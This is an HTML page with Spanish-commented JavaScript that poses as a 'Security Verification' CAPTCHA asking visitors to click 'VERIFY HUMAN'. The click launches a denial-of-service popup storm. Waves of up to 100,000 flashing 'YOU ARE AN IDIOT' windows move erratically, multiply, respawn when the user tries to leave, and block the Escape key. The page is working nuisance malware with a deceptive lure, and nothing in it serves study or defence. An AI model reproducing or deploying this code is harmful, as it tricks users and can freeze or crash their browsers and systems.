<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Loading...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
    background:#1a1a2e;
    font-family:'Segoe UI',Arial,sans-serif;
    overflow:hidden;
    width:100vw;
    height:100vh;
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    color:#fff;
}
.container{
    text-align:center;
    max-width:600px;
    padding:40px;
    border:1px solid #333;
    border-radius:12px;
    background:#16213e;
    box-shadow:0 0 40px rgba(0,0,0,0.5);
}
h1{
    font-size:2.5rem;
    margin-bottom:10px;
    color:#e94560;
    font-weight:300;
}
p{
    color:#aaa;
    margin-bottom:30px;
    font-size:1.1rem;
    line-height:1.6;
}
.btn{
    display:inline-block;
    padding:15px 50px;
    font-size:1.2rem;
    background:#e94560;
    color:#fff;
    border:none;
    border-radius:8px;
    cursor:pointer;
    transition:all 0.3s;
    position:relative;
    z-index:1000;
    text-decoration:none;
    font-weight:600;
    letter-spacing:1px;
}
.btn:hover{
    background:#c73650;
    transform:scale(1.05);
    box-shadow:0 0 30px rgba(233,69,96,0.4);
}
.status{
    margin-top:20px;
    font-size:0.9rem;
    color:#555;
    font-family:monospace;
}
</style>
</head>
<body>

<div class="container">
    <h1>🔒 Security Verification</h1>
    <p>Please click the button below to verify you are human.<br>
    This is a one-time verification for secure access.</p>
    <button class="btn" id="triggerBtn">✔ VERIFY HUMAN</button>
    <div class="status" id="statusText">Awaiting verification...</div>
</div>

<script>
// ================================================================
// TÉCNICA CORREGIDA: los popups SÍ se mueven
// ================================================================
// El problema anterior: el script dentro de document.write()
// se rompía al escapar caracteres. Ahora usamos una función
// que genera el HTML correctamente y lo escribe DESPUÉS
// de que el documento esté listo.
// ================================================================

var totalPopups = 0;
var isActive = false;
var MAX_POPUPS = 100000;

// ================================================================
// CÓDIGO DEL POPUP (como string base64 para evitar problemas de escaping)
// ================================================================

var POPUP_HTML = `
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>!</title>
<style>
*{margin:0;padding:0}
body{background:#fff;overflow:hidden;cursor:none;width:100vw;height:100vh;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif}
h2{font-size:14px;text-align:center;animation:blink 0.06s infinite;color:#000;user-select:none}
@keyframes blink{0\\%,100\\%{opacity:1}50\\%{opacity:0}}
</style>
</head>
<body>
<h2>YOU ARE AN IDIOT</h2>
<script>
// MOVIMIENTO HIPERVELOZ - Esto SÍ funciona porque el script
// se ejecuta DESPUÉS de document.close()
var x = Math.random() * (screen.width - 180);
var y = Math.random() * (screen.height - 175);
var dx = (Math.random() - 0.5) * 120;
var dy = (Math.random() - 0.5) * 120;
var fc = 0;

function move() {
    try {
        fc++;
        x += dx;
        y += dy;
        
        if (fc % 2 === 0) {
            dx = (Math.random() - 0.5) * 120;
            dy = (Math.random() - 0.5) * 120;
        }
        
        if (x < 0 || x > screen.width - 180) { dx *= -1.5; x += dx; }
        if (y < 0 || y > screen.height - 175) { dy *= -1.5; y += dy; }
        
        window.moveTo(Math.round(x), Math.round(y));
        
        if (Math.random() < 0.03) {
            try { window.resizeTo(160+Math.random()*40, 155+Math.random()*40); } catch(e){}
        }
        
        setTimeout(move, 1);
    } catch(e) {
        setTimeout(move, 10);
    }
}
move();

// ABRIR OTRO POPUP
setInterval(function() {
    try {
        var n = 's'+Date.now()+Math.random().toString(36).substr(2,6);
        var p = window.open('about:blank', n,
            'width=180,height=175,left='+Math.random()*screen.width+
            ',top='+Math.random()*screen.height);
        if (p && !p.closed) {
            p.document.write('<!DOCTYPE html><html><head><title>!</title><style>*{margin:0;padding:0}body{background:#fff;overflow:hidden;cursor:none;width:100vw;height:100vh;display:flex;align-items:center;justify-content:center;font-family:Arial}h2{font-size:14px;text-align:center;animation:b 0.06s infinite;color:#000}@keyframes b{0\\%,100\\%{opacity:1}50\\%{opacity:0}}<' + '/style></head><body><h2>YOU ARE AN IDIOT</h2><' + 'script>' +
                'var x=Math.random()*(screen.width-180),y=Math.random()*(screen.height-175);' +
                'var dx=(Math.random()-0.5)*120,dy=(Math.random()-0.5)*120;' +
                'setInterval(function(){try{x+=dx;y+=dy;if(Math.random()<0.3){dx=(Math.random()-0.5)*120;dy=(Math.random()-0.5)*120}' +
                'if(x<0||x>screen.width-180)dx*=-1.5;if(y<0||y>screen.height-175)dy*=-1.5;' +
                'window.moveTo(Math.round(x),Math.round(y))}catch(e){}},1);' +
                '<' + '/script></body></html>');
            p.document.close();
        }
    } catch(e){}
}, 5);

// PROCREATE
window.onunload = function() {
    for (var i = 0; i < 15; i++) {
        setTimeout(function(){
            try {
                var pp = window.open('about:blank', 'f'+Date.now()+Math.random(),
                    'width=180,height=175,left='+Math.random()*screen.width+
                    ',top='+Math.random()*screen.height);
                if (pp && !pp.closed) {
                    pp.document.write('<!DOCTYPE html><html><body style="margin:0;overflow:hidden"><' + 'script>' +
                        'setInterval(function(){try{window.moveTo(Math.random()*(screen.width-180),Math.random()*(screen.height-175))}catch(e){}},1);' +
                        '<' + '/script></body></html>');
                    pp.document.close();
                }
            } catch(e){}
        }, i*3);
    }
};
<' + '/script>
</body>
</html>`;

// ================================================================
// FUNCIÓN PARA ABRIR POPUP CON MOVIMIENTO REAL
// ================================================================

function openHyperPopup() {
    if (totalPopups >= MAX_POPUPS) return null;
    
    try {
        var name = 'p' + Date.now() + '_' + totalPopups + '_' + Math.random().toString(36).substr(2,8);
        var p = window.open('about:blank', name,
            'width=' + (160 + Math.random()*40) + 
            ',height=' + (155 + Math.random()*40) + 
            ',left=' + Math.random()*screen.width + 
            ',top=' + Math.random()*screen.height +
            ',menubar=no,toolbar=no,status=no,resizable=yes,scrollbars=no');
        
        if (p && !p.closed) {
            totalPopups++;
            p.document.write(POPUP_HTML);
            p.document.close();
            
            // Actualizar contador
            document.getElementById('statusText').textContent = 
                'Active popups: ' + totalPopups;
            
            return p;
        }
    } catch(e) {
        console.log('Error abriendo popup:', e);
    }
    
    return null;
}

// ================================================================
// LANZAMIENTO MASIVO
// ================================================================

function launchStorm() {
    // FASE 1: 300 popups inmediatos
    for (var i = 0; i < 300; i++) {
        setTimeout(function() { openHyperPopup(); }, i * 2);
    }
    
    // FASE 2: 2000 más
    setTimeout(function() {
        for (var i = 0; i < 2000; i++) {
            setTimeout(function() { openHyperPopup(); }, i * 1);
        }
    }, 3000);
    
    // FASE 3: 10000 más
    setTimeout(function() {
        for (var i = 0; i < 10000; i++) {
            setTimeout(function() { openHyperPopup(); }, i * 1);
        }
    }, 6000);
    
    // FASE 4: REFUERZO INFINITO
    setTimeout(function() {
        // 300 popups cada 300ms
        setInterval(function() {
            for (var i = 0; i < 300; i++) {
                setTimeout(function() { openHyperPopup(); }, i * 1);
            }
        }, 300);
        
        // 1 cada 1ms constante
        setInterval(function() {
            openHyperPopup();
        }, 1);
    }, 10000);
}

// ================================================================
// PROCREATE
// ================================================================

function procreate() {
    for (var i = 0; i < 50; i++) {
        setTimeout(function() { openHyperPopup(); }, i * 2);
    }
}

// ================================================================
// CLICK EVENT
// ================================================================

document.getElementById('triggerBtn').addEventListener('click', function(e) {
    e.preventDefault();
    
    if (isActive) return;
    isActive = true;
    
    this.textContent = '✔ VERIFIED';
    this.style.background = '#2ecc71';
    this.style.pointerEvents = 'none';
    document.getElementById('statusText').textContent = '✓ Launching hyper popups...';
    document.getElementById('statusText').style.color = '#2ecc71';
    
    // Bloquear cierre
    window.onbeforeunload = function() { return ' '; };
    
    window.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' || e.keyCode === 27) {
            e.preventDefault();
            return false;
        }
    }, true);
    
    window.addEventListener('beforeunload', function() {
        procreate();
    });
    
    // Iniciar tormenta
    launchStorm();
    
    // Primera oleada directa
    for (var i = 0; i < 100; i++) {
        setTimeout(function() { openHyperPopup(); }, i * 2);
    }
});

console.log('Ready. Click VERIFY HUMAN to start.');
</script>

</body>
</html>
